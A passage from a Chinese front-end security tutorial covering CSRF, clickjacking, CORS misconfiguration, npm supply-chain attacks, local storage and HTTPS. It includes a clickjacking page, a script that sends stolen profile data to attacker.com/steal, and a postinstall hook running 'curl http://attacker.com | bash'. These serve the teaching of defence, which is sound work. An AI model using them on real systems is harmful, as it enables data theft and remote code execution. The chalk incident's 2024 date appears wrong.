<span class="hljs-comment">// 结果：Cookie 不会发送，用户需要重新登录</span>

<span class="hljs-comment">// 场景2：evil.com 的脚本发起对 bank.com 的请求</span>
<span class="hljs-comment">// 结果：Cookie 不会发送，请求失败</span>

<span class="hljs-comment">// 场景3：bank.com 内部的链接跳转</span>
<span class="hljs-comment">// 结果：Cookie 正常发送</span>
</code></pre>
<p>Chrome 从 2020 年开始，没设置 SameSite 的 Cookie 默认当作 <code>Lax</code> 处理，大大提升了安全性。</p>
<p><strong>3. 验证 Origin/Referer 头</strong></p>
<p>检查请求的 <code>Origin</code> 或 <code>Referer</code> 头，拒绝来自其他域的请求：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 后端验证</span>
<span class="hljs-keyword">const</span> origin = req.<span class="hljs-property">headers</span>.<span class="hljs-property">origin</span> || req.<span class="hljs-property">headers</span>.<span class="hljs-property">referer</span>;

<span class="hljs-keyword">if</span> (!origin || !origin.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'https://yoursite.com'</span>)) {
  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">'Forbidden'</span>);
}
</code></pre>
<p>但这个方法有局限性：</p>
<ul>
<li>某些情况下这两个头可能不存在（隐私设置、代理）</li>
<li>可以作为额外防护层，但不应单独依赖</li>
</ul>
<p><strong>4. 双重 Cookie 验证</strong></p>
<p>将 token 同时存在 Cookie 和请求参数中，服务器比对两者是否一致：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 登录时设置</span>
res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'csrf_token'</span>, token);

<span class="hljs-comment">// 前端发请求时，从 cookie 读取 token 并放到请求头</span>
<span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">'csrf_token='</span>)[<span class="hljs-number">1</span>];
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/action'</span>, {
  <span class="hljs-attr">headers</span>: { <span class="hljs-string">'X-CSRF-Token'</span>: token }
});

<span class="hljs-comment">// 后端验证</span>
<span class="hljs-keyword">const</span> cookieToken = req.<span class="hljs-property">cookies</span>.<span class="hljs-property">csrf_token</span>;
<span class="hljs-keyword">const</span> headerToken = req.<span class="hljs-property">headers</span>[<span class="hljs-string">'x-csrf-token'</span>];
<span class="hljs-keyword">if</span> (cookieToken !== headerToken) {
  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">'CSRF token mismatch'</span>);
}
</code></pre>
<p>攻击者的跨站请求虽然能自动带上 Cookie，但无法读取 Cookie 内容，也就拿不到 token 放到请求头里。</p>
<hr/>
<h2 data-id="heading-6">点击劫持：障眼法</h2>
<p>点击劫持（Clickjacking）是把目标网站用透明 iframe 嵌入到攻击者网站，用户以为在点攻击者的页面，实际点的是 iframe 里的目标网站。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph 攻击者页面
        A[假按钮: 领取优惠券]
        B[透明iframe: 银行转账页面]
    end

    C[用户] --&gt;|点击假按钮| A
    A -.-&gt;|实际触发| B
    B --&gt;|执行| D[银行转账操作]
</code></pre>
<h3 data-id="heading-7">攻击场景</h3>
<p>攻击者页面上放了个"领取优惠券"按钮，但按钮下面是透明的 iframe，iframe 里加载的是银行网站的转账确认按钮：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 攻击者页面 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
  <span class="hljs-selector-tag">iframe</span> {
    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.01</span>;  <span class="hljs-comment">/* 几乎透明 */</span>
    <span class="hljs-attribute">position</span>: absolute;
    <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">z-index</span>: <span class="hljs-number">9999</span>;
  }
  <span class="hljs-selector-class">.fake-button</span> {
    <span class="hljs-attribute">position</span>: absolute;
    <span class="hljs-attribute">top</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">left</span>: <span class="hljs-number">100px</span>;
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://bank.com/transfer"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fake-button"</span>&gt;</span>领取优惠券<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
</code></pre>
<p>用户点"领取优惠券"，实际触发了 iframe 里银行网站的转账确认按钮。</p>
<h3 data-id="heading-8">防护手段</h3>
<p><strong>1. X-Frame-Options 头</strong></p>
<p>最简单有效的方法：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">X-Frame-Options:</span> <span class="hljs-string">DENY</span>        <span class="hljs-comment"># 完全禁止被 iframe 嵌入</span>
<span class="hljs-attr">X-Frame-Options:</span> <span class="hljs-string">SAMEORIGIN</span>  <span class="hljs-comment"># 只允许同源嵌入</span>
</code></pre>
<p>Nginx 配置：</p>
<pre><code class="hljs language-nginx" lang="nginx">add_header X-Frame-Options "SAMEORIGIN" always;
</code></pre>
<p><strong>2. CSP frame-ancestors（推荐）</strong></p>
<p>更现代的方案，功能更强大：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-attribute">Content-Security-Policy</span>: frame-ancestors <span class="hljs-string">'self'</span> <span class="hljs-attribute">https</span>:<span class="hljs-comment">//trusted.com</span>
</code></pre>
<p>可以指定多个允许的域名，比 X-Frame-Options 灵活：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 只允许同源</span>
Content-Security-Policy: frame-ancestors <span class="hljs-string">'self'</span>

<span class="hljs-comment"># 允许多个信任域名</span>
Content-Security-Policy: frame-ancestors <span class="hljs-string">'self'</span> https://trusted1.com https://trusted2.com

<span class="hljs-comment"># 完全禁止</span>
Content-Security-Policy: frame-ancestors <span class="hljs-string">'none'</span>
</code></pre>
<p><strong>3. SameSite Cookie</strong></p>
<p>即使页面被嵌入 iframe，设置了 <code>SameSite=Strict</code> 或 <code>SameSite=Lax</code> 的 Cookie 不会发送，用户在 iframe 里相当于未登录状态，无法完成敏感操作。</p>
<p><strong>4. 前端检测</strong></p>
<p>JavaScript 检测页面是否被嵌入：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>.<span class="hljs-property">top</span> !== <span class="hljs-variable language_">window</span>.<span class="hljs-property">self</span>) {
  <span class="hljs-comment">// 页面被嵌入 iframe</span>
  <span class="hljs-comment">// 可以跳出 iframe 或显示警告</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">top</span>.<span class="hljs-property">location</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">self</span>.<span class="hljs-property">location</span>;
}
</code></pre>
<p>但这个方法不太可靠，攻击者可以用 <code>sandbox</code> 属性禁用脚本。建议作为辅助手段，主要还是靠 HTTP 头。</p>
<p>这三个手段建议同时使用，形成纵深防御。</p>
<hr/>
<h2 data-id="heading-9">CORS 配置错误：开错了门</h2>
<p>CORS（跨域资源共享）本身是安全机制，但配置不当反而会造成漏洞。</p>
<h3 data-id="heading-10">危险配置示例</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 后端代码 - 危险示例</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-comment">// 把请求的 Origin 直接反射回去，太危险了</span>
  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Origin'</span>, req.<span class="hljs-property">headers</span>.<span class="hljs-property">origin</span>);
  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Credentials'</span>, <span class="hljs-string">'true'</span>);
  <span class="hljs-title function_">next</span>();
});
</code></pre>
<p>这样配置等于对所有网站敞开大门。攻击者网站可以发请求获取用户数据：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 攻击者网站 (evil.com)</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.target.com/user/profile'</span>, {
  <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span>  <span class="hljs-comment">// 带上 cookie</span>
})
.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> {
  <span class="hljs-comment">// 拿到用户敏感信息，发送给攻击者服务器</span>
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://attacker.com/steal'</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data)
  });
});
</code></pre>
<p>因为响应头允许任意 Origin 并且允许携带凭证，攻击者可以轻松窃取用户数据。</p>
<h3 data-id="heading-11">安全配置</h3>
<p><strong>1. 白名单验证</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> allowedOrigins = [
  <span class="hljs-string">'https://myapp.com'</span>,
  <span class="hljs-string">'https://admin.myapp.com'</span>,
  <span class="hljs-string">'https://mobile.myapp.com'</span>
];

app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> origin = req.<span class="hljs-property">headers</span>.<span class="hljs-property">origin</span>;
  <span class="hljs-keyword">if</span> (allowedOrigins.<span class="hljs-title function_">includes</span>(origin)) {
    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Origin'</span>, origin);
    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Credentials'</span>, <span class="hljs-string">'true'</span>);
  }
  <span class="hljs-title function_">next</span>();
});
</code></pre>
<p><strong>2. 正则匹配（谨慎使用）</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> allowedOriginPattern = <span class="hljs-regexp">/^https:\/\/.*\.myapp\.com$/</span>;

app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> origin = req.<span class="hljs-property">headers</span>.<span class="hljs-property">origin</span>;
  <span class="hljs-keyword">if</span> (origin &amp;&amp; allowedOriginPattern.<span class="hljs-title function_">test</span>(origin)) {
    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Origin'</span>, origin);
    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Credentials'</span>, <span class="hljs-string">'true'</span>);
  }
  <span class="hljs-title function_">next</span>();
});
</code></pre>
<p>注意正则要严格，避免被绕过。比如 <code>/\.myapp\.com$/</code> 可以被 <code>evil.com.myapp.com</code> 绕过。</p>
<p><strong>3. 限制允许的方法和头</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Methods'</span>, <span class="hljs-string">'GET, POST, PUT, DELETE'</span>);
res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Headers'</span>, <span class="hljs-string">'Content-Type, Authorization'</span>);
res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Max-Age'</span>, <span class="hljs-string">'86400'</span>);  <span class="hljs-comment">// 预检请求缓存 24 小时</span>
</code></pre>
<p><strong>CORS 安全原则</strong>：</p>
<ul>
<li>不要用通配符 <code>*</code>（而且 <code>*</code> 和 <code>credentials: true</code> 不能同时用）</li>
<li>不要动态反射 Origin 而不验证</li>
<li>白名单要精确到协议+域名+端口</li>
<li>限制允许的 HTTP 方法</li>
<li>敏感接口不要开启 CORS，或者严格限制 Origin</li>
</ul>
<hr/>
<h2 data-id="heading-12">依赖安全：供应链攻击</h2>
<p>npm 生态有个问题：安装一个包会引入 79 个第三方依赖和 39 个维护者的隐式信任。如果某个依赖被攻击者控制，你的项目就危险了。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    subgraph 你的项目
        A[package.json]
    end

    subgraph 直接依赖
        B[lodash]
        C[axios]
    end

    subgraph 间接依赖
        D[follow-redirects]
        E[form-data]
        F[...]
    end

    A --&gt; B
    A --&gt; C
    C --&gt; D
    C --&gt; E
    D --&gt; F

    style F fill:#ff6b6b,color:#fff
    G[攻击者控制的包] -.-&gt;|替换/入侵| F
</code></pre>
<h3 data-id="heading-13">真实案例</h3>
<p><strong>2024 年 chalk 攻击事件</strong></p>
<p>攻击者通过钓鱼邮件入侵了知名包 <code>chalk</code> 的维护者账号，篡改了代码。<code>chalk</code> 每周下载量超 2 亿次，影响面巨大。恶意代码会在浏览器端执行，劫持加密货币钱包交易。虽然 2.5 小时后就被发现并撤回，但已经有不少项目中招。</p>
<p>同时被攻击的还有 <code>debug</code>、<code>ansi-styles</code> 等 18 个热门包，总下载量超 20 亿次/周。</p>
<h3 data-id="heading-14">常见攻击手法</h3>
<p><strong>1. 依赖混淆</strong></p>
<p>公司内部用私有 npm 源，包名叫 <code>@company/utils</code>。攻击者在公共 npm 上注册同名包，如果配置不当，npm 可能优先安装公共源的恶意包。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 攻击者注册公共包</span>
npm publish @company/utils

<span class="hljs-comment"># 公司内部安装时，如果没正确配置，可能装到恶意包</span>
npm install @company/utils
</code></pre>
<p><strong>2. 恶意安装脚本</strong></p>
<p>npm 包可以在 <code>package.json</code> 里定义安装脚本：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"preinstall"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node malicious.js"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"postinstall"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"curl http://attacker.com | bash"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>一 <code>npm install</code>，脚本就执行了。可以窃取环境变量、源码、密钥等。</p>
<p><strong>3. Typosquatting（错别字攻击）</strong></p>
<p>注册与知名包相似的名字，等人打错字：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 正确的包</span>
npm install lodash

<span class="hljs-comment"># 攻击者注册的恶意包</span>
npm install loadash  <span class="hljs-comment"># 少个 d</span>
npm install lodahs   <span class="hljs-comment"># h 和 s 位置反了</span>
</code></pre>
<h3 data-id="heading-15">防御供应链攻击</h3>
<p><strong>1. 锁定依赖版本</strong></p>
<p>用 <code>package-lock.json</code> 或 <code>yarn.lock</code> 固定依赖版本，防止自动升级引入恶意代码：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// package.json - 精确版本，不要用 ^ 或 ~</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"lodash"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"4.17.21"</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// 精确版本</span>
    <span class="hljs-attr">"axios"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.6.2"</span>        <span class="hljs-comment">// 不用 ^1.6.2 或 ~1.6.2</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>并且提交 <code>package-lock.json</code> 到代码仓库。</p>
<p><strong>2. 使用 npm ci</strong></p>
<p>CI/CD 流程中用 <code>npm ci</code> 而不是 <code>npm install</code>，确保严格按照 lock 文件安装：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># CI 脚本</span>
npm ci              <span class="hljs-comment"># 严格按 lock 文件安装</span>
npm run build
npm <span class="hljs-built_in">test</span>
</code></pre>
<p><code>npm ci</code> 的特点：</p>
<ul>
<li>删除 <code>node_modules</code> 重新安装</li>
<li>严格按 lock 文件，不会修改它</li>
<li>如果 lock 文件和 package.json 不一致会报错</li>
</ul>
<p><strong>3. 定期审计依赖</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># npm 内置审计</span>
npm audit
npm audit fix       <span class="hljs-comment"># 自动修复</span>

<span class="hljs-comment"># 或者用第三方工具</span>
npx snyk <span class="hljs-built_in">test</span>       <span class="hljs-comment"># Snyk</span>
npx socket security <span class="hljs-comment"># Socket</span>
</code></pre>
<p>设置 CI 自动检查：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># GitHub Actions</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Security</span> <span class="hljs-string">audit</span>
  <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">audit</span> <span class="hljs-string">--audit-level=moderate</span>
</code></pre>
<p><strong>4. 禁用安装脚本</strong></p>
<p>如果不需要运行安装脚本，可以禁用：</p>
<pre><code class="hljs language-bash" lang="bash">npm install --ignore-scripts
</code></pre>
<p>在 <code>.npmrc</code> 里全局设置：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">ignore-scripts</span>=<span class="hljs-literal">true</span>
</code></pre>
<p>需要运行脚本时手动执行：</p>
<pre><code class="hljs language-bash" lang="bash">npm rebuild
</code></pre>
<p><strong>5. 私有源 + 白名单</strong></p>
<p>公司内部搭建私有 npm 源（如 Verdaccio），只允许审核过的包进入。配合 <code>@scope</code> 命名空间使用：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// .npmrc</span>
@company<span class="hljs-punctuation">:</span>registry=https<span class="hljs-punctuation">:</span><span class="hljs-comment">//npm.company.com</span>
registry=https<span class="hljs-punctuation">:</span><span class="hljs-comment">//registry.npmjs.org</span>
</code></pre>
<p>这样 <code>@company/</code> 开头的包走私有源，其他包走公共源。</p>
<p><strong>6. 检查依赖完整性</strong></p>
<p>使用 Subresource Integrity（SRI）验证 CDN 资源：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>
  <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.example.com/library.js"</span>
  <span class="hljs-attr">integrity</span>=<span class="hljs-string">"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"</span>
  <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">"anonymous"</span>
&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>如果 CDN 资源被篡改，浏览器会拒绝加载。</p>
<p><strong>7. 减少依赖数量</strong></p>
<p>少用依赖。一个 <code>left-pad</code> 这种功能自己写几行代码就能搞定，没必要引入外部包：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 不需要安装 left-pad</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">leftPad</span>(<span class="hljs-params">str, len, char = <span class="hljs-string">' '</span></span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">String</span>(char).<span class="hljs-title function_">repeat</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, len - <span class="hljs-title class_">String</span>(str).<span class="hljs-property">length</span>)) + str;
}
</code></pre>
<p>每多一个依赖就多一个风险点。定期检查 <code>node_modules</code>，移除不用的包。</p>
<p><strong>工具推荐</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flirantal%2Flockfile-lint" target="_blank" title="https://github.com/lirantal/lockfile-lint" ref="nofollow noopener noreferrer">lockfile-lint</a>：检测 lockfile 是否被篡改</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnaugtur%2Fnpm-audit-resolver" target="_blank" title="https://github.com/naugtur/npm-audit-resolver" ref="nofollow noopener noreferrer">npm-audit-resolver</a>：更好的漏洞修复工具</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsnyk.io%2F" target="_blank" title="https://snyk.io/" ref="nofollow noopener noreferrer">Snyk</a>：依赖安全扫描</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsocket.dev%2F" target="_blank" title="https://socket.dev/" ref="nofollow noopener noreferrer">Socket</a>：实时监控依赖变化</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdependabot" target="_blank" title="https://github.com/dependabot" ref="nofollow noopener noreferrer">Dependabot</a>：GitHub 自动更新依赖的安全补丁</li>
</ul>
<hr/>
<h2 data-id="heading-16">本地存储安全：不该放的别放</h2>
<p>localStorage 和 sessionStorage 很方便，但它们对 JavaScript 完全可见。只要页面有 XSS 漏洞，攻击者就能把里面的东西全偷走。</p>
<h3 data-id="heading-17">不要存这些</h3>
<ul>
<li><strong>JWT Token</strong>：最常见的错误，XSS 一发生就被偷走</li>
<li><strong>用户密码</strong>：即使加密也不要存在前端</li>
<li><strong>个人敏感信息</strong>：身份证号、银行卡号、手机号等</li>
<li><strong>API 密钥</strong>：应该在后端管理</li>
<li><strong>会话 ID</strong>：用 HttpOnly Cookie 更安全</li>
</ul>
<h3 data-id="heading-18">如果非要存</h3>
<ol>
<li><strong>评估风险</strong>：确认这个数据泄露后的影响</li>
<li><strong>加密存储</strong>：虽然不能阻止 XSS 攻击者拿到密文，但至少增加破解成本</li>
<li><strong>设置过期时间</strong>：自己实现过期机制，减少长期暴露的风险</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 封装带过期时间的存储</span>
<span class="hljs-keyword">const</span> secureStorage = {
  <span class="hljs-title function_">set</span>(<span class="hljs-params">key, value, ttl = <span class="hljs-number">3600000</span></span>) {  <span class="hljs-comment">// 默认 1 小时</span>
    <span class="hljs-keyword">const</span> item = {
      value,
      <span class="hljs-attr">expiry</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() + ttl
    };
    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(key, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(item));
  },

  <span class="hljs-title function_">get</span>(<span class="hljs-params">key</span>) {
    <span class="hljs-keyword">const</span> itemStr = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(key);
    <span class="hljs-keyword">if</span> (!itemStr) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

    <span class="hljs-keyword">const</span> item = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(itemStr);
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() &gt; item.<span class="hljs-property">expiry</span>) {
      <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(key);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    <span class="hljs-keyword">return</span> item.<span class="hljs-property">value</span>;
  },

  <span class="hljs-title function_">remove</span>(<span class="hljs-params">key</span>) {
    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(key);
  }
};

<span class="hljs-comment">// 使用</span>
secureStorage.<span class="hljs-title function_">set</span>(<span class="hljs-string">'tempData'</span>, { <span class="hljs-attr">foo</span>: <span class="hljs-string">'bar'</span> }, <span class="hljs-number">60000</span>);  <span class="hljs-comment">// 1 分钟过期</span>
<span class="hljs-keyword">const</span> data = secureStorage.<span class="hljs-title function_">get</span>(<span class="hljs-string">'tempData'</span>);
</code></pre>
<h3 data-id="heading-19">推荐方案</h3>
<p>认证 token 优先考虑 <strong>HttpOnly Cookie</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 后端设置</span>
res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'auth_token'</span>, token, {
  <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,      <span class="hljs-comment">// JavaScript 访问不到</span>
  <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>,        <span class="hljs-comment">// 只在 HTTPS 下发送</span>
  <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'strict'</span>,  <span class="hljs-comment">// 防 CSRF</span>
  <span class="hljs-attr">maxAge</span>: <span class="hljs-number">3600000</span>      <span class="hljs-comment">// 1 小时过期</span>
});

<span class="hljs-comment">// 前端发请求时，浏览器会自动带上 cookie</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/user/profile'</span>, {
  <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span>
});
</code></pre>
<p>这样即使有 XSS 漏洞，攻击者也拿不到 token。</p>
<h3 data-id="heading-20">IndexedDB 和 Web SQL</h3>
<p>它们也有同样的问题，JavaScript 可以完全访问。不要用来存敏感数据。</p>
<hr/>
<h2 data-id="heading-21">HTTPS：传输安全的基础</h2>
<p>HTTP 是明文传输，中间人能看到和修改所有内容。HTTPS 用 TLS/SSL 加密，提供三个保障：</p>
<ol>
<li><strong>内容加密</strong>：中间人看不到传输内容</li>
<li><strong>身份认证</strong>：确保访问的是真正的服务器，不是中间人伪造的</li>
<li><strong>数据完整性</strong>：防止内容被篡改</li>
</ol>
<h3 data-id="heading-22">HTTPS 工作原理</h3>
<p>HTTPS 用的是混合加密：<strong>非对称加密 + 对称加密</strong>。</p>
<p><strong>为什么不全用非对称加密？</strong></p>
<ul>
<li>非对称加密安全但慢（RSA 加密速度比 AES 慢 1000 倍）</li>
<li>对称加密快但不安全（密钥怎么传输？）</li>
</ul>
<p>所以结合两者：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant 客户端
    participant 服务器

    rect rgb(200, 230, 255)
        Note over 客户端, 服务器: 握手阶段（非对称加密）
        客户端-&gt;&gt;服务器: 1. 请求HTTPS连接
        服务器-&gt;&gt;客户端: 2. 返回数字证书(含公钥)
        客户端-&gt;&gt;客户端: 3. 验证证书合法性
        客户端-&gt;&gt;服务器: 4. 生成对称密钥，用公钥加密发送
        服务器-&gt;&gt;服务器: 5. 用私钥解密，获取对称密钥
    end

    rect rgb(200, 255, 200)
        Note over 客户端, 服务器: 传输阶段（对称加密）
        客户端-&gt;&gt;服务器: 6. 用对称密钥加密数据
        服务器-&gt;&gt;客户端: 7. 用对称密钥加密响应
    end
</code></pre>
<ol>
<li>
<p><strong>握手阶段（非对称加密）</strong>：</p>
<ul>
<li>客户端请求 HTTPS 连接</li>
<li>服务器返回数字证书（包含公钥）</li>
<li>客户端验证证书合法性</li>
<li>客户端生成随机对称密钥，用服务器公钥加密后发送</li>
<li>服务器用私钥解密，拿到对称密钥</li>
</ul>
</li>
<li>
<p><strong>数据传输阶段（对称加密）</strong>：</p>
<ul>
<li>双方用协商好的对称密钥加密所有数据</li>
<li>速度快，安全性也有保障</li>
</ul>
</li>
</ol>
<h3 data-id="heading-23">数字证书如何防止中间人攻击</h3>
<p>中间人可能拦截服务器的公钥，替换成自己的。数字证书解决这个问题：</p>
<ol>
<li>
<p><strong>证书包含</strong>：</p>
<ul>
<li>服务器公钥</li>
<li>域名信息</li>
<li>证书颁发机构（CA）的数字签名</li>
</ul>
</li>
<li>
<p><strong>验证流程</strong>：</p>
<ul>
<li>浏览器用 CA 的公钥验证数字签名</li>
<li>CA 的公钥内置在操作系统/浏览器中</li>
<li>如果签名验证失败，说明证书被篡改</li>
</ul>
</li>
<li>
<p><strong>信任链</strong>：</p>
<ul>
<li>根 CA（受信任的权威机构）</li>
<li>中间 CA</li>
<li>服务器证书</li>
</ul>
</li>
</ol>
<p>中间人即使拦截并替换证书，也无法伪造 CA 的签名，浏览器会报警告。</p>
<h3 data-id="heading-24">前端要注意的</h3>
<p><strong>1. 强制 HTTPS</strong></p>
<p>配置重定向，HTTP 自动跳 HTTPS：</p>
<pre><code class="hljs language-nginx" lang="nginx">server {
  listen 80;
  server_name example.com;
  return 301 https://$server_name$request_uri;
}

server {
  listen 443 ssl http2;
  server_name example.com;

  ssl_certificate /path/to/cert.pem;
  ssl_certificate_key /path/to/key.pem;

  # 现代 SSL 配置
  ssl_protocols TLSv1.2 TLSv1.3;
  ssl_ciphers HIGH:!aNULL:!MD5;
  ssl_prefer_server_ciphers on;
}
</code></pre>
<p><strong>2. HSTS（HTTP Strict Transport Security）</strong></p>
<p>告诉浏览器以后只用 HTTPS 访问：</p>
<pre><code class="hljs language-ini" lang="ini">Strict-Transport-Security: <span class="hljs-attr">max-age</span>=<span class="hljs-number">31536000</span><span class="hljs-comment">; includeSubDomains; preload</span>
</code></pre>
<ul>
<li><code>max-age=31536000</code>：1 年内强制 HTTPS</li>
<li><code>includeSubDomains</code>：包括所有子域名</li>
<li><code>preload</code>：加入浏览器预加载列表（去 hstspreload.org 提交）</li>
</ul>
<p>设置 HSTS 后，即使用户输入 <code>http://example.com</code>，浏览器也会自动改成 <code>https://</code>。</p>
